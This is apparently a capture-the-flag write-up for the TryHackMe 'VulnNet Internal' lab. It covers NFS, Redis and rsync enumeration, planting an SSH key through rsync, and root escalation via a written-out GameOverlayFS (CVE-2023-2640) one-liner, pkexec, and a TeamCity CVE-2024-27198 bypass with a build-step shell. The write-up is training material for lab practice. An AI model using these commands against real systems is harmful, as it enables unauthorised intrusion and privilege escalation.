---
image: "/assets/img/posts/Copie-de-Copie-de-Manager_e71d97877c.png"
title: "Vulnet Internal Tryhackme"
description: "VulnNet Entertainment est une entreprise qui apprend de ses erreurs. Elle s"
pubDate: "2024-05-16"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


## Reconnaissance





To get started, we run a quick initial nmap scan to see which ports are open.





  `








```bash


└─# rustscan --ulimit 5000 -b 1000 -n -a 10.10.220.246


Host is up, received timestamp-reply ttl 61 (0.65s latency).


Scanned at 2024-05-17 15:42:32 EDT for 1s





PORT    STATE SERVICE     REASON


22/tcp  open  ssh         syn-ack ttl 61


111/tcp open  rpcbind     syn-ack ttl 61


139/tcp open  netbios-ssn syn-ack ttl 61





```


`





We Lets use enum4linux to get detailed information.





  `








```bash


└─# enum4linux -a 10.10.220.246





```


`





[![enum4linux](/assets/img/posts/sh_438be4d980.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





Next, we access the Shares sharing.





  `








```bash


└─# smbclient //10.10.220.246/shares -N


Try "help" to get a list of possible commands.


smb: \> dir


  .                                   D        0  Tue Feb  2 04:20:09 2021


  ..                                  D        0  Tue Feb  2 04:28:11 2021


  temp                                D        0  Sat Feb  6 06:45:10 2021


  data                                D        0  Tue Feb  2 04:27:33 2021





                11309648 blocks of size 1024. 3278712 blocks available


smb: \> cd data


smb: \data\> dir


  .                                   D        0  Tue Feb  2 04:27:33 2021


  ..                                  D        0  Tue Feb  2 04:20:09 2021


  data.txt                            N       48  Tue Feb  2 04:21:18 2021


  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021





```


`For port 111 I use the showmount tool to find information on the NFS server`








```bash


─# showmount -e 10.10.220.246


Export list for 10.10.220.246:


/opt/conf *





```


`





Ok so I'm going to mount this NFS share that I just found.





  `








```bash


└─# mount -o nolock 10.10.220.246:/opt/conf mnt 


# ls mnt 


hp  init  opt  profile.d  redis  vim  wildmidi


                                                                                                                                     


┌──(root㉿MrR0807)-[/home/MrR0807/CTFs/TryHackMe]


└─# ls mnt/redis


redis.conf





```


`





We find a redis.conf configuration containing a password.





  `








```bash


#


# 2) if slave-serve-stale-data is set to no the slave will reply with


#    an error "SYNC with master in progress" to all the kind of commands


#    but to INFO and SLAVEOF.


#


slave-serve-stale-data yes


requirepass "B65Hx562F@ggAZ@F"





```


`





We check if the Redis service is open with netcat.





  `








```bash


─# nc -nv 10.10.220.246 6379


(UNKNOWN) [10.10.220.246] 6379 (redis) open





```


`





Now, I will use the redis-cli tool to connect me





  `








```bash


─# redis-cli -h 10.10.220.246 --pass B65Hx562F@ggAZ@F


Warning: Using a password with -a or -u option on the command line interface may not be safe.


10.10.220.246:6379> INFO


# Server


redis_version:4.0.9


redis_git_sha1:00000000


redis_git_dirty:0


redis_build_id:9435c3c2879311f3


redis_mode:standalone


os:Linux 4.15.0-135-generic x86_64


arch_bits:64


multiplexing_api:epoll


atomicvar_api:atomic-builtin


gcc_version:7.4.0


process_id:489


run_id:94d8fdcc6c56026d36bd87180f925f9ca616ba31


tcp_port:6379


uptime_in_seconds:1653


uptime_in_days:0


hz:10


lru_clock:4700236


executable:/usr/bin/redis-server


config_file:/etc/redis/redis.conf





```


`





I will check the location of Redis data on this Server.





  `








```bash


10.10.220.246:6379> config get dir


1) "dir"


2) "/var/lib/redis"





```


`





We Lets use Redis commands to find and read internal keys. I left the link in the Reference





  `








```bash


10.10.220.246:6379> KEYS *


1) "int"


2) "tmp"


3) "internal flag"


4) "authlist"


5) "marketlist"


(0.65s)


10.10.220.246:6379> 


10.10.220.246:6379> GET "internal flag"


"THM{ff8e518addbbddb74531a724236a8221}"





```


`





Details of these orders:





I use the KEYS * parameter to find all available keys. Next, GET keyname to read the key `








```bash


10.10.220.246:6379> LRANGE marketlist 1 3


1) "Penetration Testing"


2) "Programming"


3) "Data Analysis"


(0.65s)


10.10.220.246:6379> 


10.10.220.246:6379> LRANGE authlist 1 3


1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="


2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="


3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="





```


`Here I use LRANGE key start stop to Get a range of elements from a list





I just got a base64, so I decode it in Terminal





  `








```bash


# echo $base| base64 -d      


Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v





```


`





I am sent to an rsync and I will use the rsync tool to connect





  `








```bash


# nc -nv 10.10.220.246 873 


(UNKNOWN) [10.10.220.246] 873 (rsync) open


@RSYNCD: 31.0





```


`





We Lets use rsync to access the files.





  `








```bash


# rsync --list-only rsync://rsync-connect@10.10.220.246/files


Password: 


drwxr-xr-x          4,096 2021/02/01 07:51:14 .


drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal


drwxrwxr-x          4,096 2021/02/06 06:43:14 sys-internal/.ssh


drwx------          4,096 2021/02/02 06:16:16 sys-internal/.thumbnails


drwx------          4,096 2021/02/02 06:16:16 sys-internal/.thumbnails/large


drwx------          4,096 2021/02/02 06:16:18 sys-internal/.thumbnails/normal


-rw-------          8,437 2021/02/02 06:16:17 sys-internal/.thumbnails/normal/2b53c68a980e4c943d2853db2510acf6.png


-rw-------          6,345 2021/02/02 06:16:18 sys-internal/.thumbnails/normal/473aeca0657907b953403884c53d865c.png


-rw-------            978 2021/02/02 06:16:18 sys-internal/.thumbnails/normal/539380d1cb60fcd744fd5094d314fdc1.png


drwx------          4,096 2021/02/01 07:53:21 sys-internal/Desktop


drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Documents


drwxr-xr-x          4,096 2021/02/01 08:46:46 sys-internal/Downloads


drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Music


drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Pictures


drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Public


drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Templates


drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Videos





sent 185 bytes  received 76,450 bytes  5,285.17 bytes/sec


total size is 41,708,382  speedup is 544.25





```


`





Next, We synchronize our SSH key with the .sshdistant directory.





  `








```bash


└─# cat /root/.ssh/id_rsa.pub > authorized_keys 


─# rsync authorized_keys rsync://rsync-connect@10.10.220.246/files/sys-internal/.ssh/


Password:





```


`





I check to see if the ssh key has been correctly set up





  `








```bash


─# rsync --list-only rsync://rsync-connect@10.10.220.246/files/sys-internal/.ssh/


Password: 


drwxrwxr-x          4,096 2024/05/17 16:41:05 .


-rw-r--r--             22 2024/05/17 16:41:05 authorized_keys





```


`





[![ssh keys](https://i.ibb.co/ckqX6Zb/success.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





## Privilege Escalation





To address Privilege Escalation, I will explore three different methods on this Ubuntu 4.15.0 machine with the Ubuntu 18.04 LTS (Bionic Beaver) operating system.





### Méthode 1: Exploitation de GameOverlayFs(CVE-2023-2640)





A system is likely to be vulnerable to this vulnerability if the kernel version is lower than 6.2. While our Machine is 4.15.0-135-generic therefore usable.





This vulnerability exclusively affects Linux-based systems. The easiest way to check if your system is vulnerable is to see which version of the Linux kernel it is using by running the uname -r command.





First I will check if the version is lower than 6.2





  `








```bash


sys-internal@vulnnet-internal:/home$ uname -r


4.15.0-135-generic





```


`





We have version 4.15 so vulnerable so I will try to exploit it





To do this, I go to /tmp and execute `








```bash


sys-internal@vulnnet-internal:~$ cd /tmp


sys-internal@vulnnet-internal:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")





```


`





Cela me permet dobtenir un shell en tant que root.





  `








```bash


root@vulnnet-internal:/tmp# id


uid=0(root) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)


root@vulnnet-internal:/tmp# whoami


root


root@vulnnet-internal:/tmp# ls /root


root.txt


root@vulnnet-internal:/tmp# cat /root/root.txt


THM{e8996faea46df09dba5676dd271c60bd}





```


`


### Méthode 2: Exploitation de pkexec(SUID)





Looking in the SUIDs, there is pkexec.





[![pkexec](/assets/img/posts/pk_8d7189d685.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





To exploit it I use a Python3 script available on GitHub to exploit it





[![exploit pkexec](/assets/img/posts/explo_b930b10d82.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





### Méthode 3: Exploitation de TeamCity





Finally, I will explore operating a TeamCity server. by using an exploit for the CVE-2024-27198 vulnerability that allows bypassing authentication on TeamCity, I gain super user privileges by executing commands in the TeamCity server.





To get started, I check the ports running in the background on the machine by using the ss -tupln command. I identify an open port, port 8111.





[![TeamCity](/assets/img/posts/811_71ec258324.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





By searching on Google, I confirm that this port is used by a TeamCity server





[![TeamCity](/assets/img/posts/teamcity_a3401f3874.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





From there, I configure port forwarding to access the TeamCity server from my local machine using the following SSH command:





  `








```bash


└─# ssh -L 8111:127.0.0.1:8111 sys-internal@10.10.245.63





```


`





[![Port Forward](/assets/img/posts/fwd_284afe27e4.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





This creates a local link from port 8111 on my machine to port 8111 on the remote server. After having established this connection, I can access the TeamCity server from my browser by using the address 127.0.0.1:8111.





[![Login](/assets/img/posts/Teamcity_938e26dfed.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





We have a login page without having identifiers and password. So what I would like is to Bypass this page and have Super User privileges





> NOTE: In February 2024, the Rapid7 research team identified two new vulnerabilities affecting the JetBrains TeamCity CI/CD server including CVE-2024-27198 which is an authentication bypass vulnerability in the TeamCity web component that originates from an alternate path issue (CWE-288) and has a base CVSS score of 9.8 (Critical).


To bypass this Login page, I will use [this exploit](https://github.com/Chocapikk/CVE-2024-27198) available on Github





[![Poc](/assets/img/posts/exploit_8fb0008667.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





By launching the exploit, a user is created with the following identifiers:





Username: d9zkck4mPassword: 5FycViGMlO Next, I log in with these identifiers.





[![Started](/assets/img/posts/get_85a2b1a5c2.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





### Obtaining an RCE as Root on TeamCity





To obtain an RCE (Remote Code Execution) as a root on TeamCity, I relied on an interesting article from TeamCity which explains how to execute command line scripts on the platform.





[![Hacked TeamCity](/assets/img/posts/hacked-Team_f7740256ca.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





In the TeamCity interface, I follow the process indicated in the article. After having created a new project, I move on to configuring the build steps.





[![Build TeamCity](/assets/img/posts/build_8473dda0ba.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





In the build step configuration, I select the option to run a command line script.





[![Build Step](/assets/img/posts/build-step_e764e5d6e3.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





When asked to provide a script, I insert a malicious script to gain a root shell on the machine.





[![Shell](/assets/img/posts/shell_83be00bb06.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





After submitting the script and launching the project, I click RUN to start executing the malicious script.





[![Run](/assets/img/posts/run_68a485aa31.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





Once the script runs successfully, I get a shell locally as root, giving me full RCE on the machine.





[![root](/assets/img/posts/root_ce55c15d78.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





## Ressources supplementaires





Here are some additional resources that might be helpful to you:





[GameOverlayFS](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)[Redis All Commands](https://www.javatpoint.com/redis-all-commands)[Chocapikk Poc for CVE-2024-27198](https://github.com/Chocapikk/CVE-2024-27198)[How to Run Command-Line Scripts in TeamCity](https://www.jetbrains.com/teamcity/tutorials/general/running-command-line-scripts/)[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=VulnNet%20Internal%20-%20TryHackMe(Easy)%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fvulnet-internal-tryhackme%2F)       [](https://www.facebook.com/sharer/sharer.php?title=VulnNet%20Internal%20-%20TryHackMe(Easy)%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fvulnet-internal-tryhackme%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fvulnet-internal-tryhackme%2F&text=VulnNet%20Internal%20-%20TryHackMe(Easy)%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fvulnet-internal-tryhackme%2F)


